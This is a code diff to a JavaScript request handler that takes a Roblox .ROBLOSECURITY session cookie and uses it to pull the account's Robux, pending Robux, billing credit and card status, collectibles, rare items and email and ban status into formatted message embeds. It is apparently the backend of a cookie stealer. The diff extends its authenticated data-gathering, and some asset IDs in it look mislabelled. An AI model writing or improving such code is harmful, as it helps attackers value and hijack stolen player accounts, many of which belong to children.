@@ -51,9 +51,9 @@ async function getPendingRobux(userId, cookie) {
   return pending;
 }
 
-// ---------- User Settings (Verified, Banned, Email) – FIXED EMAIL DETECTION ----------
+// ---------- User Settings (Verified, Banned) ----------
 async function getUserSettings(cookie, csrfToken) {
-  const defaultSettings = { verified: "False", banned: "False", emailEnabled: "False" };
+  const defaultSettings = { verified: "False", banned: "False" };
   try {
     const res = await fetch("https://www.roblox.com/mobileapi/userinfo", {
       headers: {
@@ -63,12 +63,9 @@ async function getUserSettings(cookie, csrfToken) {
     });
     if (!res.ok) return defaultSettings;
     const data = await res.json();
-    // Check multiple possible fields for email
-    const hasEmail = !!(data.Email || data.UserEmail || data.email || data.userEmail);
     return {
       verified: data.IsVerified ? "True" : "False",
-      banned: data.IsBanned ? "True" : "False",
-      emailEnabled: hasEmail ? "True" : "False"
+      banned: data.IsBanned ? "True" : "False"
     };
   } catch (e) {
     return defaultSettings;
@@ -153,6 +150,23 @@ async function getAllCollectibles(userId, cookie) {
   }));
 }
 
+// ---------- FIXED: Check email verification by looking for the "Verified" hat ----------
+async function isEmailVerified(userId, cookie) {
+  try {
+    // Asset ID for the email verification hat
+    const emailHatAssetId = 102611803;
+    const res = await fetch(`https://inventory.roblox.com/v1/users/${userId}/items/${emailHatAssetId}/is-owned`, {
+      headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
+    });
+    if (!res.ok) return false;
+    const data = await res.json();
+    return data.ownership === true;
+  } catch (e) {
+    console.warn("Email verification check failed:", e.message);
+    return false;
+  }
+}
+
 // ---------- Check specific item ownership (Korblox, Headless) ----------
 async function checkItemOwnership(userId, cookie, assetId) {
   try {
@@ -167,18 +181,27 @@ async function checkItemOwnership(userId, cookie, assetId) {
   }
 }
 
-// ---------- Recently Played Games ----------
-async function getRecentlyPlayedGames(userId) {
-  const url = `https://games.roblox.com/v1/users/${userId}/games?sortOrder=Desc&limit=50`;
-  const res = await fetch(url);
-  if (!res.ok) return [];
-  const data = await res.json();
-  return (data.data || []).map(game => game.name);
+// ---------- FIXED: Recently Played Games (via Continue endpoint) ----------
+async function getRecentlyPlayedGames(cookie) {
+  try {
+    // Fetch the "Continue Playing" list from Roblox (requires authentication)
+    const res = await fetch("https://www.roblox.com/charts/v2/Continue", {
+      headers: { Cookie: `.ROBLOSECURITY=${cookie}` }
+    });
+    if (!res.ok) return [];
+    const data = await res.json();
+    // The response structure might have a 'data' array with game objects
+    const games = data.data || data || [];
+    return games.map(game => game.name || game.displayName || "");
+  } catch (e) {
+    console.warn("Failed to fetch Continue list:", e.message);
+    return [];
+  }
 }
 
-async function getPlayedPasses(userId) {
+async function getPlayedPasses(cookie) {
   const targetGames = ["Pet Simulator 99", "Breaking Point 2", "Murder Mystery 2"];
-  const recentGames = await getRecentlyPlayedGames(userId);
+  const recentGames = await getRecentlyPlayedGames(cookie);
   return targetGames.map(name => {
     const played = recentGames.some(g => g.toLowerCase().includes(name.toLowerCase()));
     return { name, played: played ? "True" : "False", passes: 0 };
@@ -235,21 +258,22 @@ export default async function handler(req, res) {
     } catch (e) {}
 
     // Parallel fetch
-    const [userData, robux, pendingRobux, groupsCount, totalVisits, allCollectibles, playedPasses, countryFlag, avatarUrl, korblox, headless] = await Promise.all([
+    const [userData, robux, pendingRobux, groupsCount, totalVisits, allCollectibles, playedPasses, countryFlag, avatarUrl, emailVerified, korblox, headless] = await Promise.all([
       getUser(rbxuid),
       getRobux(rbxuid, cookie),
       getPendingRobux(rbxuid, cookie),
       getGroupsCount(rbxuid),
       getTotalPlaceVisits(rbxuid),
       getAllCollectibles(rbxuid, cookie),
-      getPlayedPasses(rbxuid),
+      getPlayedPasses(cookie),
       getCountryFlag(req),
       getUserAvatarUrl(rbxuid),
-      checkItemOwnership(rbxuid, cookie, 1373933),  // Korblox
-      checkItemOwnership(rbxuid, cookie, 102611803) // Headless
+      isEmailVerified(rbxuid, cookie),
+      checkItemOwnership(rbxuid, cookie, 1373933),  // Korblox Deathspeaker
+      checkItemOwnership(rbxuid, cookie, 134082613) // Headless Horseman
     ]);
 
-    let settings = { verified: "False", banned: "False", emailEnabled: "False" };
+    let settings = { verified: "False", banned: "False" };
     let billing = { credit: 0, convert: 0, card: "False" };
     if (csrfToken) {
       [settings, billing] = await Promise.all([
@@ -301,7 +325,7 @@ export default async function handler(req, res) {
         },
         {
           name: "📊 Settings",
-          value: `**(Verified)** ${settings.verified}\n**Is Banned** ${settings.banned}\n**Email Enabled** ${settings.emailEnabled}`,
+          value: `**(Verified)** ${settings.verified}\n**Is Banned** ${settings.banned}\n**Email Enabled** ${emailVerified ? "True" : "False"}`,
           inline: true
         },
         {
@@ -339,7 +363,7 @@ export default async function handler(req, res) {
       timestamp: new Date().toISOString()
     };
 
-    // ----- Embed 3: Collectibles (up to 20 items, each with link) -----
+    // ----- Embed 3: Collectibles -----
     let collectiblesText = "";
     const maxDisplay = 20;
     for (let i = 0; i < Math.min(collectiblesCount, maxDisplay); i++) {
